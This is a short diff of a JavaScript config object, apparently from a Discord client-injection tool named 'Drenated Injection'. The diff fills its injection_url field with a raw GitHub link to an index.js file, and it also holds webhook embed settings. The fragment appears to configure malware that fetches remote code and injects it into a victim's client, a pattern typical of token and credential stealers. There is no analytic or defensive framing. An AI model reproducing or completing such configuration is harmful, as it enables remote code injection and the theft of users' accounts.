@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Drenated Injection', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1036868084243369994/1191718226036531240/7ddfad5b8cb9072f96a1010a34639f0216ff0487_full-modified.jpg?ex=65a67516&is=65940016&hm=3c6b15d22e054511514d1ad1f63be57e63330a5806e343398aa459901e03558c&'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: '', 
+  injection_url: 'https://raw.githubusercontent.com/Vice1337/Home/main/index.js', 
   /**
    
    **/
